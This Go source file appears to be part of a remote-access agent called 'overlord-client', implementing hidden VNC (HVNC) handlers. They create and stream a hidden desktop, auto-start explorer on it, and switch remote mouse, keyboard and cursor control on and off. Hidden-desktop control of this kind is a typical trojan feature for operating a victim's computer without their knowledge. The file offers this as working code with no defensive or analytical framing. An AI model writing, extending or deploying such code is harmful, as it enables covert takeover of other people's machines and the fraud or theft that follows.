package handlers

import (
	"context"
	"log"
	"overlord-client/cmd/agent/capture"
	rt "overlord-client/cmd/agent/runtime"
	"sync"
	"time"
)

var (
	hvncPersistedDisplayValue int
	hvncPersistedDisplayMu    sync.Mutex
)

func persistHVNCDisplaySelection(display int) {
	hvncPersistedDisplayMu.Lock()
	hvncPersistedDisplayValue = display
	hvncPersistedDisplayMu.Unlock()
}

func GetPersistedHVNCDisplay() int {
	hvncPersistedDisplayMu.Lock()
	defer hvncPersistedDisplayMu.Unlock()
	return hvncPersistedDisplayValue
}

func HVNCStart(ctx context.Context, env *rt.Env, autoStartExplorer bool) error {
	interval, fps := streamInterval("OVERLORD_HVNC_MAX_FPS", 120)
	capture.SetH264TargetFPS(fps)
	log.Printf("hvnc: starting stream (max fps %d)", fps)

	if err := capture.InitializeHVNCDesktop(); err != nil {
		log.Printf("hvnc: failed to initialize hidden desktop: %v", err)
		return err
	}

	if autoStartExplorer {
		go func() {
			if err := capture.HVNCAutoStartExplorer(); err != nil {
				log.Printf("hvnc: auto-start explorer error: %v", err)
			}
		}()
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			log.Printf("hvnc: stopping stream")
			capture.CleanupHVNCDesktop()
			return nil
		case <-ticker.C:
			if err := capture.NowHVNC(ctx, env); err != nil {
				if ctx.Err() != nil {
					log.Printf("hvnc: stopping stream")
					capture.CleanupHVNCDesktop()
					return nil
				}
				log.Printf("hvnc: capture error: %v", err)
			}
		}
	}
}

func HVNCSelect(ctx context.Context, env *rt.Env, display int) error {
	prev := env.HVNCSelectedDisplay
	maxDisplays := capture.HVNCMonitorCount()
	if display < 0 || display >= maxDisplays {
		log.Printf("hvnc: WARNING - requested display %d out of range (0-%d), clamping to 0", display, maxDisplays-1)
		display = 0
	}
	env.HVNCSelectedDisplay = display

	persistHVNCDisplaySelection(display)
	log.Printf("hvnc: set selected display from %d to %d (reported monitors=%d, will capture monitor at index %d)", prev, display, maxDisplays, display)
	return nil
}

func HVNCMouseControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.HVNCMouseControl = enabled
	log.Printf("hvnc: mouse control %v", enabled)
	return nil
}

func HVNCKeyboardControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.HVNCKeyboardControl = enabled
	log.Printf("hvnc: keyboard control %v", enabled)
	return nil
}

func HVNCCursorControl(ctx context.Context, env *rt.Env, enabled bool) error {
	env.HVNCCursorCapture = enabled
	capture.SetHVNCCursorCapture(enabled)
	log.Printf("hvnc: cursor capture %v", enabled)
	return nil
}
